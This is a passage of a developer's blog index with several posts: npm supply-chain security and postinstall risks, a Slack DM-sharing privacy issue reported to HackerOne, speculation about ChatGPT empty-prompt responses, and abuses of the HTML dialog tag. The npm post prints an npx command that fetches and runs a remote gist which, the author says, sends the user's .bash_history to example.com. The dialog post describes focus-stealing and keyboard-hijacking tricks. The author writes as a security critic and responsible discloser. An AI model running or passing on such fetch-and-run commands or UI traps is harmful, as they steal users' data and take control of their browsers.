– a sophisticated and long-term attempt to gain control of a library used in many package managers of most Linux distributions.</p><p>Since then, many more incidents have happened, and to be specific <strong>NPM</strong> has become the largest and <em>easiest</em> way to ship malware. At first, most of it was aimed at stealing cryptocurrency (because techbros seem to be obsessed with magic electic money and are easy prey). But now, these supply chain attacks are starting to target more critical things like tokens and access keys of the package maintainers, as seen with the <a href=https://snyk.io/blog/weaponizing-ai-coding-agents-for-malware-in-the-nx-malicious-package/ target=_blank>NX</a>
incident and now <a href=https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised target=_blank>several depedencies that are used daily by thousands of developers</a>
.</p><p>Again&mldr; this is <a href=https://en.wikipedia.org/wiki/Npm_left-pad_incident target=_blank>nothing new</a>
in the land of NPM.</p><p>But it didn&rsquo;t have to be this way&mldr;</p><h3 id=weve-come-along-way-but-have-travelled-nowhere>We&rsquo;ve come along way, but have travelled nowhere</h3><p>I have a long history with NodeJS – around 2010 I started working on a startup, and this was <a href=https://www.slideshare.net/slideshow/techmeetup-edinburgh-nodejs-talk/5742191 target=_blank>before npm was even a thing</a>
.</p><p><img src=https://tane.dev/images/npm-before-it-was-a-thing.png alt="A sceenshot of a slide with an announcement of npm as a package manage for node"></p><p>Back in the misty days of the 1990s most JavaScript security issues were not much of a backend concern: this was mostly the domain of Perl, PHP, Python, and Java.</p><p><em>The web however was a much different story.</em></p><p>In the very early days of the World Wide Web there was really only one main browser everyone used: Netscape Navigator. Released in 1994 it was not <em>just a browser</em>: throughout its life it had various incarnations of a built-in email client, calendar, HTML editor with FTP browser, and with plugins could play media files like Realplayer and MP3 (which I remember at its launch) and Flash movies and games. It&rsquo;s where JavaScript was born.</p><p>Many of the early websites of the day were static – popular tools to build websites included <a href=https://en.wikipedia.org/wiki/HotDog target=_blank>HotDog</a>
or <a href=https://en.wikipedia.org/wiki/Windows_Notepad target=_blank>Notepad</a>
. No fancy IDEs or frameworks, just a text editor, a browser, and <code>alert()</code> to debug.</p><blockquote><p>Microsoft had also entered the game with Internet Explorer – included in an early Windows DLC called &ldquo;Plus! For Windows 95&rdquo;. It eventually became the software that Microsoft bet its whole company strategy around (much like today with AI).</p></blockquote><p>Internet Explorer was embedded into every aspect of Windows – first in 1995 with Active Desktop, which continued all the way to Windows XP. With it you could embed a frame item on your Desktop, but also a Rich Text document or Excel spreadsheet. It was also bloated and buggy – and with that it presented two problems: a massive security risk and exposure to accusations of monopolising the browser market.</p><blockquote><p>The law came after Microsoft hard and in 2001 it won – Microsoft was told to break up its monopoly. One aspect was that it had to offer other browsers on its operating system (a similar story happening now to Apple) – but it also wasn&rsquo;t forced to <strong>remove</strong> Internet Explorer.</p></blockquote><p>Microsoft essentially <em>abandoned</em> IE; as the years rolled on they continued to push out new major verions to capture the market, but without fixing the major flaws. It still shipped as default with the OS, unable to be removed without breaking other parts of the system.</p><p>Each release of Internet Explorer added something new to the browser landscape, but it also continued to add bugs and flaws on top of the ones that no one touched – by default, on all Windows systems lived code that could <a href="https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-012?redirectedfrom=MSDN" target=_blank>give hijackers access to users machines</a>
.</p><blockquote><p>It wasn&rsquo;t until 2015 they finally abandoned the existing Internet Explorer codebase and shifted to a new engine before eventually settling on their <del>Chome</del>Blink-based engine. However the ghost of IE <a href=https://www.forbes.com/sites/zakdoffman/2024/07/11/microsoft-warning-21-days-to-update-or-stop-using-windows/ target=_blank>still haunts us today</a>
.</p></blockquote><h3 id=the-ticking-time-bomb-of-postinstall>The ticking time-bomb of postinstall</h3><p>8 years ago, I wrote a small <a href=https://github.com/tanepiper/steal-ur-stuff target=_blank>proof of concept</a>
. It was in response to <a href=https://github.com/npm/npm/issues/17724 target=_blank>this issue</a>
about <code>npx</code> – a small tool that had just been added to <code>npm</code> by default whether you liked it or not.</p><p>With <code>npx</code> you could now run the following arbitary command (PLEASE DO NOT RUN THIS SCRIPT):</p><pre tabindex=0><code>npx https://gist.github.com/tanepiper/6cb9067adca626cd2c0edbc3786dad7b
</code></pre><p>This would now pull the gist as a node module and run it. In the proof-of-concept I put this command as a <code>postinstall</code> script. If you look at the gist, it&rsquo;s a small binary script that posts your <code>.bash_history</code> to example.com – which at the time <code>npx</code> would just run.</p><p>My frustration at the time was aimed mostly towards <code>npx</code> itself – it seemed like the NPM team were adding a new easy-to-use attack vector by shipping a tool that could run <em>any module from any source on the web, on your machine without user interaction</em>. But little did I know at the time there was a deeper problem lurking with <code>postinstall</code>.</p><blockquote><p>At the time I also created a <a href=https://github.com/tanepiper/npm-lint target=_blank>package.json linter</a>
that would warn of potential issues. But of course it required projects to opt in, it needed trust, and I didn&rsquo;t see a way forward for it.</p></blockquote><p>This was, of course, <em>before</em> Microsoft, via GitHub, owned NPM.</p><h3 id=a-short-bit-of-history>A short bit of history</h3><p>So how did NPM become the main package manager for Node? Back then, it solved a problem – it was as simple as that – and people noticed it and adopted it. Over time, more useful little libraries showed up and from that, the rest is history.</p><p>NPM, built on CouchDB which enabled fast replication, allowed a flourishing and open JavaScript ecosystem. In the beginning, it was a bit of a wild west, where people tended to cut corners or miss steps. There was also a lot of early abandonment of libraries, and communities started to form around some of the larger ones to at least establish them as de facto tools – Express.js for example has been around since before <code>npm</code> (and for all the complaints about performance aimed at it: it&rsquo;s highly battle tested and the worst bugs have likely been squashed).</p><p>Node and npm&rsquo;s future was not a guaranteed thing. At some point, there was fragmentation of the ecosystem – tools such as <code>yarn</code> and <code>pnpm</code> exist because <code>npm</code> couldn&rsquo;t or wouldn&rsquo;t fix something, but they introduced their own changes that only made them partially compatible with each other. In 2014, for a short while we even had a fork of NodeJS called <code>io-js</code> because of fundamental disagreements.</p><p>There was also the small problem that all of this infrastructure and services cost money to run.</p><blockquote><p>To paraphrase <a href=https://blog.ceejbot.com/ target=_blank><em>C J Silverio</em></a>
– &ldquo;There&rsquo;s no money in package managers.&rdquo;</p></blockquote><p>In 2018 Microsoft bought GitHub (and until this year ran it as a side-concern with its own CEO and management team – just last month, the CEO stepped down and now GitHub is part of the &ldquo;AI&rdquo; team). In 2020, GitHub bought NPM – with pockets deep enough to run the infrastructure. This means that Microsoft owns the world&rsquo;s largest repository of JavaScript code, the distribution channel for its packages – and the development ecosystem with VSCode.</p><p>This likely saved <code>npm</code> in the long run by them simply having the resources to do so.</p><p>On the other hand, they have done little to make it a more secure tool, especially for enterprise customers. To their credit, GitHub has provided <a href=https://www.infoq.com/news/2024/05/github-dependabot-supply-chain/ target=_blank>new tools for Software Bill of Materials Attestastion</a>
, which is a step in the right direction. But right now there are still no signed dependencies and nothing stopping people using AI agents, or just plain old scripts, from creating thousands of junk or namesquatting repositories.</p><p>&mldr; and as we&rsquo;ve learned 2-Factor Authentication isn&rsquo;t enough secure npm.</p><hr><h3 id=i-want-to-get-back-to-the-fun-of-building-software>I want to get back to the fun of building software</h3><p>Ultimately, I don&rsquo;t think we can trust the software ecosystem provided by Microsoft anymore. It&rsquo;s too fragile, brittle in the wrong places, and too open to abuse, and for most of my career I have seen the causes and effects first hand. This has made software development less fun, and more of a chore.</p><p>The tools we use to build software are not secure by default, and almost all of the time, the companies that provide them are not held to account for the security of their products.</p><p>Without a concerted effort across the industry to make the software supply chain secure by default, we will continue to see a rise in incidents – and the risks to data privacy and security will only increase. Criminal and state actors are always looking to exploit the vulnerabilities in our software; the use of AI to create more sophisticated attacks will only improve. These don&rsquo;t have to be technical either – deep fakes are close enough to be used as effective social engineering tools - and it&rsquo;s very easy to fake emails that seem very legitimte.</p><p>Unfortunately, Microsoft seem to be actively hostile - in their lack of attempts to shut down an active security hole that&rsquo;s almost a decade old, they have left their customers are the higest levels of risk seen in computing.</p><blockquote><p>For many companies, now is the right time to start looking at the tools they use to build software, and to start asking the hard questions about the security of their software supply chain – is it putting their customers, workers, or own profits at risk?</p></blockquote></div></div><div class=post><div class=post-heading><h1><a href=https://tane.dev/2023/09/slack-wants-you-you-know-this-privacy-exploit-is-fine/>Slack wants you you know this privacy exploit is fine</a></h1><div class=meta><i class="far fa-calendar-edit" title="The date when this post was originally published" aria-label="The date when this post was originally published"></i><span>&nbsp;Published: Sep 25, 2023</span>

<a class=flex-item href=https://tane.dev/tags/exploits>Exploits</a>
<a class=flex-item href=https://tane.dev/tags/security>Security</a></div></div><div class=post-content><p>Last week, after a call with the engineers on my team I wanted to send a message to two of the engineers at the same time - little did I know I&rsquo;d find what I believe to be a nasty privacy exploit in <a href=https://slack.com target=_blank>Slack</a>
- one that made me ask &ldquo;Why is this <em>even</em> a feature?&rdquo;</p><p>Like any good responsible software engineer, instead of taking to social media or forums to post about the exploit - I opted to report it to <a href=https://hackerone.com target=_blank>HackerOne</a>
- where Slack accepts reports of potential security exploits. After giving a detailed list of instructions on how to achive it (Report #2171907).</p><p>Shortly after (within 40 minutes) I recieved a reply which slightly dumbfounded me - the full reply is below, but began &ldquo;We have reviewed your submission, and while this behavior is not perfectly ideal, it is intended.&rdquo;</p><p>After asking some people in the Infosec community what is the right next step, I was advised that I&rsquo;m within my rights to inform about this, mostly to give fair warning to Slack users that this exploit exists.</p><h2 id=unforeseen-consequences>Unforeseen Consequences</h2><p>So what was this exploit I found - in some way it&rsquo;s so deliciously simple, that I had to double check it actually happened. I found it by using Slack &ldquo;as intended&rdquo; - but the result was not what was expected, with an unclear UI about the consequences - and I believe for most users who may experience it, would not realise what has happened. Certainly in the moment it could cause real harm to users, under certain circumstances.</p><p>The list of actions is as follows:</p><ol><li>Click on a user in Direct Messages</li><li>Click on the user name at the top where the chevron is located</li><li>Click "Add people to this coversation" (up to 9 people)</li><li>Add one or more users to the conversation</li></ol><p>You will now receive a popup with several options - in this case, because I couldn&rsquo;t find the original DM with the pair of engineers in the UI it seemed like the option &ldquo;Include conversation history?&rdquo; seemed sensible.</p><p><em>In hindsight, it does have a message at the top of the screen - but in the moment as many know, these messages when not labeled as warnings can be missed or ignored by users -</em> <strong>or any bad actor with access to the appropriate Slack account</strong></p><p>So now a private DM conversation, going all the way back to the beginning of this history has now been shared with all the people added to it, attachments and all.</p><p><strong>The person in the DM thread received no consent to allow this action.</strong></p><p>But what now makes it worse is that this whole DM is now a thread, and a thread can be turned into a private channel.</p><p>Once turned into a private channel, the original person in the DM can be removed from the entire room - no longer having access to any of the messages. Also as a channel a much larger number of people (like a whole organisation) can be added to it.</p><h2 id=ok-what-now>OK, what now?</h2><p>So the functionality is working as intended.</p><p>But what if I&rsquo;m a disgruntled employee who has some DMs with a board member who was sharing internal confidential information? Or a bully who happens to find an unlocked computer of a fellow employee they know is in a secret relationship? Or a hacker who has managed to get into a key account of a Slack that hasn&rsquo;t enabled 2FA, or via a magic link in their email account because of a weak password?</p><p><a href=https://slack.com/intl/en-au/blog/news/slack-security-update target=_blank>Its not like unauthorised access to systems is not a thing</a>
&mldr;</p><h2 id=slacks-reply-and-caveats>Slack&rsquo;s reply and caveats</h2><p>To be fair to Slack, I will include the response below where they include their reasons why this is &ldquo;as intended&rdquo;.</p><p>I&rsquo;ll leave it up to you the reader to decide if it&rsquo;s enough of a mitigation, or if many companies would even have the processes to begin to deal with this an an immediate threat - I can guess many companies using it don&rsquo;t even have a dedicated CSO, team managing slack - and likely use default settings.</p><blockquote><p>Thank you for your report.</p></blockquote><blockquote><p>We have reviewed your submission, and while this behavior is not perfectly ideal, it is intended. In this “attack”, a user must have the permission to create private Channels, and this can be restricted by Owners/Admins.</p></blockquote><blockquote><p>In addition, the DM messages are not truly deleted when performing this behavior. An Admin/Owner with the necessary permissions to manage private Channels can always access the content within private Channels if necessary.</p></blockquote><blockquote><p>For these reasons, we are relatively satisfied with our security at this time, and we will be closing this report as Informative. Regardless, we appreciate your efforts here, and hope you continue to submit to our program.</p></blockquote><blockquote><p>Thanks, and good luck with your future bug hunting.</p></blockquote></div></div><div class=post><div class=post-heading><h1><a href=https://tane.dev/2023/04/i-think-i-found-a-privacy-exploit-in-chatgpt/>I Think I Found a Privacy Exploit in ChatGPT</a></h1><div class=meta><i class="far fa-calendar-edit" title="The date when this post was originally published" aria-label="The date when this post was originally published"></i><span>&nbsp;Published: Apr 14, 2023</span>

<code>Initially, I thought these might be hallucinations, but now I suspect they could also include other users' responses from the API</code></p><p>Last month, OpenAI unveiled their advanced large language model, <a href=https://openai.com/product/gpt-4 target=_blank>ChatGPT-4</a>
, attracting attention from developers, enterprises, media, and <a href=https://www.theguardian.com/technology/2023/mar/31/italy-privacy-watchdog-bans-chatgpt-over-data-breach-concerns target=_blank>governments</a>
alike.</p><p>Before receiving my GPT-4 invite, I experimented with <a href=ttps://github.com/antimatter15/alpaca.cpp>alpaca.cpp</a>
, designed to run models on CPU&rsquo;s with limited memory constraints. I began by developing a simple web interface using NodeJS and sockets for parsing the command line. Once I started working with the GPT-4 API, I quickly realized that with the right prompts, it could be a powerful tool. It has already helped me rewrite complex code into simpler methods and reduce complexity by moving code to functions:</p><div style=text-align:center><img src=https://tane.dev/images/chatgpt-code-improvement.png width=60% height=60% alt="Screenshot of ChatGPT suggesting a code improvement for creating tables by proposing a cell creation method"></div><p>However, I noticed something peculiar — due to a bug in my code, I was sending empty prompts to the ChatGPT endpoint, but I still received seemingly random responses ranging from standard AI model introductions to information about people, places, and concepts. Inspired by the coinciding <a href=https://dl.acm.org/doi/10.1145/3442188.3445922 target=_blank>#StochasticParrotsDay</a>
online conference, I transformed this into a <a href=https://mastodon.social/@StochasticEntropy target=_blank>Mastodon Bot</a>
(now moved to <a href=https://botsin.space/@StochasticEntropy target=_blank>botsin.space</a>
).</p><p>After running the bot for a month, I concluded that a significant portion of the responses without prompts <strong>might be responses for other users</strong>, potentially due to a bug that sends unintended responses when given an unsanitized empty prompt.</p><p>These could be stochastic hallucinations, random training data pulled out by <a href=https://en.wikipedia.org/wiki/Entropy_%28information_theory%29 target=_blank>Entropy</a>
, or a mix of all three possibilities.</p><p>If this is the case, then ChatGPT would not be much better than a <a href=https://en.wikipedia.org/wiki/Markov_chain target=_blank>Markov Chain</a>
, and the entire large language model/AI market has been playing us for fools.</p><p><em>However if I am correct</em> then the current OpenAI APIs could be made to potentially leak private or sensitive data, by simply not sanatising their inputs&mldr;</p><p>The bot will continue to run until at least the end of this month, and all the content will be archive at <a href=https://stochasticparrot.lol target=_blank>stochasticparrot.lol</a>

In the end I opted to use <a href=https://github.com/tanepiper/Stochastic-Parrot/actions target=_blank>GitHub Actions</a>
with scheduled tasks to create it - this allowed me to set up a script that ran hourly - calling the ChatGPT API with an empty
prompt, and turning it into a toot. I also found that passing only a space character to the Dall-E API also produced images.</p><p>With both scripts, after getting a response from OpenAI, I use it to generate one or more toots - depending on the length as a set of replies, with the images
first download them and then upload them as attachments first.</p><p>Some of the more recent toots are below - ones with a parrot emjoi (🦜) are created without a prompt, while if a prompt is used I add a speech bubble (💬)
to indicate</p><div class=toots></div><p>Once I had this up and running, I then created a small <a href=https://astro.build target=_blank>AstroJS</a>
<a href=https://stochasticparrot.lol/ target=_blank>website</a>
that outputs each entry as a posting.</p><h3 id=making-polly-speak>Making Polly Speak</h3><p>Up to this point, I had just been working with text and images - but I had recently seen <a href=http://elevenlabs.io/ target=_blank>ElevenLabs</a>
in some tech news, and that they had a text-to-speech API. After some initial issues (which used up all of the free credit) - I eventually set up another action that took the OpenAI response, and passed it to the ElevenLabs API - this then provided a MP3 stream of the speech, saved locally and again upload to Mastodon and attach to a toot.</p><div class=toots></div><p>I also decided to try see if I could get it to generate some polls. With some <a href=https://github.com/tanepiper/Stochastic-Parrot/blob/main/packages/stochastic-parrot/src/poll.mjs#L34 target=_blank>gentle prompting</a>
I was able to get it to generate JSON output which could be used in polls. Sadly, most of the time it seems to repeat the same questions over and over with just slightly different wording, occasionally coming up with something original</p><div class=toots></div><p>I even went as far as trying to generate video content - not through Stable Diffusion, but by generating text themes to use with the <a href=https://creatomate.com/ target=_blank>Createomate</a>
API - allowing me to generate social media &ldquo;fact&rdquo; videos. Unfortunatly this was a bit buggy, and due to the way Mastodon works can time out quite a bit.</p><div class=toots><article class="toot h-entry"><section class=toot-header><div class=inner><div rel=author class="h-card p-author toot-avatar"><img class=u-photo width=50 src=https://files.mastodon.social/accounts/avatars/110/040/867/511/382/207/original/5f9b9ea5a76bd34d.png>

to handle form validation and submission - it uses the validation properties of HTML5 forms directly, meaning you can
create progressive, accessible forms first.</p><p>The library is for use with the <a href=https://svelte.dev/docs#use_action target=_blank>use directive</a>
and can be bound to any element, not
just <code>&lt;form></code> ones and the library automatically handles subscription and unsubscription to any form element with
a <code>name</code> attribute.</p><p>Here is the example from the demo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>

HTML <a href=https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog target=_blank>dialog</a>
tag is and each time I&rsquo;m reminded me of
an <a href=https://tinynodes.medium.com/dark-patterns-with-the-html-5-2-dialog-tag-and-chrome-for-fun-and-profit-249ce092d200 target=_blank>old Medium post</a>
I made a few years ago about its use.</p><p>The <strong>good</strong> news is in 2021 it&rsquo;s much harder to use it to crash a user&rsquo;s browser - in
Firefox <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=840640" target=_blank>dialog.showModal is behind a flag</a>
so it has to be
specifically enabled by users. In all browsers <strong>preferred</strong> way to use this tag in 2021 is to use the <code>open</code> attribute
which is a much more sensible way of using the tag. However, it
is <a href=https://stackblitz.com/edit/dialog-dark-patterns-property target=_blank>still possible</a>
to do some things mentioned below
and <a href=https://tane.dev/images/firefox-dialog-performance.png>kill browser performance</a>
(and it&rsquo;s still possible to steal focus in
Chrome).</p><p>I thought it would be a good opportunity to revisit it as I feel it still has issues that makes it a <em>potentially</em>
dangerous tag to use on the web <em>without thinking about the implementation</em>. One thing that blogpost (and me pointing it
out) does is bring out people to say it&rsquo;s nothing to do with the platform&mldr;</p><p><img src=https://tane.dev/images/do-shit-with-browsers.png alt="So you discovered you can do shit in the browser an mess with the user"><br><img src=https://tane.dev/images/haters-gonna-hate.png alt="Except that nothing of this is related to the dialog tag, nor is the fact that it&rsquo;s &ldquo;built-in&rdquo;. If the argument is &ldquo;the built-in dialog should be restricted so that people can&rsquo;t abuse it&rdquo;, all you&rsquo;re doing is making sure abusers use a div (or different elem) as dialog instead."></p><p>Certainly, some people didn&rsquo;t agree - and it would be a valid suggestions to say this is achievable in other ways.
However, several years later I still stand by my original points:</p><ul><li>By
default, <a href=https://stackblitz.com/edit/dialog-dark-patterns-with-div target=_blank>library modals do not completely steal the users mouse focus</a>
even when in a loop of generating modals you can click elsewhere on the page (although of course they always can be
made to!)</li><li>It&rsquo;s still very easy to <a href=https://tane.dev/images/firefox-dialog-performance.png>kill browser performance</a>
very easily, very quickly
because there is no limit to the number of dialogs that can be created</li><li>The <code>&lt;dialog></code> tag is built into the platform, so there&rsquo;s no way to stop its use by blocking any offending library
code - bad actors have all the tools to do this available in the DOM with a single HTML file.</li><li>A single API is also a single attack surface - any script injection attacks don&rsquo;t have to worry about library-specific
implementations - they can
<strong>always</strong> rely on <code>document.getElementsByTagName('dialog')</code> to access <code>&lt;dialog></code> elements on the page.</li></ul><p>Over the last few years, users have also been taught bad habits to click any popup in operating systems, or in the
browser through the use of Cookie popups, newsletter popups and other generally badly implemented ideas.</p><h2 id=revisiting-the-hacks>Revisiting The Hacks</h2><p>Now on StackBlitz, I&rsquo;m using the <a href=https://stackblitz.com/edit/dialog-dark-patterns target=_blank>same demo as before</a>
with some
updates. The example does the following:</p><ul><li>Adds a listener over the close button which, when the user hovers over it disables the button and moves the modal.</li><li>Adds a second close button that when pressed closes the modal but also triggers an undesirable path (such as
installing malware because we have
a <a href=https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted target=_blank>trusted user-triggered Event</a>
that allows Web
APIs)</li><li>2 Buttons that send you into a loop of death in infinitely creating modals that can&rsquo;t be escaped, and always steals
focus.</li><li>Hijacking the users keyboard, so users cannot use <code>Esc</code>, not can they <code>Tab</code> away from the dialog or use <code>Space</code> to
click any buttons.</li></ul><h2 id=overriding-the-dom-for-fun>Overriding the DOM for fun</h2><p>One issue is that you pretty much have full control over the DOM of the dialog. This is good in many ways, but with

created <a href=https://stackblitz.com/edit/dialog-dark-patterns-shadowroot target=_blank>another example with a web component</a>
that embeds
the dialog in to a <a href=https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot target=_blank>ShadowRoot</a>
and provides the global a
state, so you cannot open more than one at a time and third-party scripts cannot access the internal <code>&lt;dialog></code>.</p><p>Hopefully you enjoy the demo and this post. I&rsquo;m not against the use of dialogs themselves - but I think providing some
way to limit the number of modals that can be shown, and limit what can and cannot be changed within it would provide a
deeper layer of secure use across the web platform.</p></div></div><div class=text-center><ul class="pagination pagination-default"><li class="page-item disabled"><a aria-disabled=true aria-label=First class=page-link role=button tabindex=-1><span aria-hidden=true>&#171;&#171;</span></a></li><li class="page-item disabled"><a aria-disabled=true aria-label=Previous class=page-link role=button tabindex=-1><span aria-hidden=true>&#171;</span></a></li><li class="page-item active"><a aria-current=page aria-label="Page 1" class=page-link role=button>1</a></li><li class=page-item><a href=https://tane.dev/blog/blog/2/ aria-label="Page 2" class=page-link role=button>2</a></li><li class=page-item><a href=https://tane.dev/blog/blog/3/ aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=https://tane.dev/blog/blog/4/ aria-label="Page 4" class=page-link role=button>4</a></li><li class=page-item><a href=https://tane.dev/blog/blog/2/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=https://tane.dev/blog/blog/4/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul></div></main></div></div><footer></footer><script src=https://tane.dev/vendor/rxjs.umd.min.cfc67dfcb1df9b0e06f96ac2e2bf29507e56ff70c80563ef778250b702add65b76253e3a28b4528f9baadca92b9b2d35f64884365ff4ae673dfeb3d0c3b61a91.js integrity="sha512-z8Z9/LHfmw4G+WrC4r8pUH5W/3DIBWPvd4JQtwKt1lt2JT46KLRSj5uq3Kkrmy019kiENl/0rmc9/rPQw7YakQ=="></script><script src=https://tane.dev/js/bundle.min.c218495446b0af055063d5a2d131d9bdbf1346a6d558d6843997c8c69e4e1f41106b5a32b053482d4fc6c6dd7c3ac1d18e0039a33506d68f311d5b6e37429eb4.js integrity="sha512-whhJVEawrwVQY9Wi0THZvb8TRqbVWNaEOZfIxp5OH0EQa1oysFNILU/Gxt18OsHRjgA5ozUG1o8xHVtuN0KetA==" defer></script><script async data-id=101405924 src=//static.getclicky.com/js></script></body></html>
